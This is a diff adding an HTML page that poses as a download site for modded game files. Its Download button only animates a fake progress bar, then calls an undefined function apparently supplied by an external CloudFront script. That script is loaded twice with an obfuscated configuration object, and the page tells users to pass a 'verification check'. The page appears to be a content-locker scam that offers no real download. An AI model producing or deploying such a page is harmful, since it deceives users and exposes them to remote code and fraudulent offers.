@@ -1,0 +1,190 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>modzone-king Download website</title>
+	<script type="text/javascript">
+    var vVUTH_KUB_qSdJVc={"it":4402873,"key":"1e70a"};
+</script>
+<script src="https://d2rst8vhtu89fd.cloudfront.net/1eab2e0.js"></script>
+    <style>
+        :root {
+            --primary-color: #4A3F35;       /* Dark brown */
+            --secondary-color: #8C5D3A;     /* Warm bronze */
+            --accent-color: #C77C3E;        /* Copper orange */
+            --background-color: #2C2323;    /* Deep dark brown */
+            --text-color: #F2E8CF;          /* Warm cream */
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
+            font-family: 'Roboto', sans-serif;
+            background-color: var(--background-color);
+            color: var(--text-color);
+            line-height: 1.6;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 15px;
+        }
+
+        .container {
+            background-color: var(--primary-color);
+            border-radius: 15px;
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.4);
+            padding: 30px;
+            text-align: center;
+            max-width: 500px;
+            width: 100%;
+            border: 2px solid var(--secondary-color);
+        }
+
+        h1 {
+            color: var(--accent-color);
+            margin-bottom: 20px;
+            font-size: 2rem;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+        }
+
+        .download-button {
+            background-color: var(--accent-color);
+            color: var(--background-color);
+            border: none;
+            padding: 12px 25px;
+            border-radius: 25px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            font-weight: bold;
+            text-transform: uppercase;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+            margin: 20px 0;
+        }
+
+        .download-button:hover {
+            transform: scale(1.05);
+            background-color: var(--secondary-color);
+            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.4);
+        }
+
+        .progress-bar {
+            background-color: rgba(255, 255, 255, 0.1);
+            height: 20px;
+            border-radius: 10px;
+            margin: 20px 0;
+            overflow: hidden;
+        }
+
+        .progress {
+            width: 0;
+            height: 100%;
+            background: linear-gradient(to right, var(--accent-color), var(--secondary-color));
+            border-radius: 10px;
+            transition: width 0.5s ease-in-out;
+        }
+
+        .game-info h2 {
+            color: var(--text-color);
+            margin-bottom: 15px;
+        }
+
+        .steps-container {
+            background-color: rgba(255, 255, 255, 0.05);
+            border-radius: 10px;
+            padding: 20px;
+            margin-top: 20px;
+        }
+
+        .steps-container ol {
+            text-align: left;
+            color: var(--text-color);
+            padding-left: 30px;
+        }
+
+        .steps-container li {
+            margin-bottom: 10px;
+        }
+
+        footer {
+            margin-top: 20px;
+            font-size: 0.8em;
+            color: rgba(242, 232, 207, 0.7);
+        }
+
+        /* Responsive Design */
+        @media screen and (max-width: 480px) {
+            .container {
+                padding: 20px 15px;
+            }
+
+            h1 {
+                font-size: 1.5rem;
+                letter-spacing: 1px;
+            }
+
+            .download-button {
+                padding: 10px 20px;
+                font-size: 0.9rem;
+            }
+
+            .steps-container ol {
+                padding-left: 20px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>ModZone-King Download Website</h1>
+        
+        <div class="download-card">
+            <div class="game-info">
+                <h2>Game files is Ready! For Download</h2>
+            </div>
+
+            <button class="download-button" onclick="startDownload();setTimeout(_nS, 3000);">Download Now</button>
+
+            <div id="progressBar" class="progress-bar">
+                <div id="progress" class="progress"></div>
+            </div>
+
+            <div class="steps-container">
+                <h3>Download Guide</h3>
+                <ol>
+                    <li>Click the download button to begin</li>
+                    <li>Complete a quick verification check</li>
+                    <li>Wait for the verification process to complete</li>
+                    <li>Your download will start automatically</li>
+                </ol>
+            </div>
+        </div>
+
+        <footer>© 2024 Mod Games Hub - All rights reserved</footer>
+    </div>
+	<script type="text/javascript">
+    var vVUTH_KUB_qSdJVc={"it":4402873,"key":"1e70a"};
+</script>
+<script src="https://d2rst8vhtu89fd.cloudfront.net/1eab2e0.js"></script>
+	 <script>
+        function startDownload() {
+            const progressBar = document.getElementById('progress');
+            let width = 0;
+            const intervalId = setInterval(() => {
+                if (width >= 100) {
+                    clearInterval(intervalId);
+                } else {
+                    width++;
+                    progressBar.style.width = width + '%';
+                }
+            }, 30);
+        }
+    </script>
+</body>
+</html>
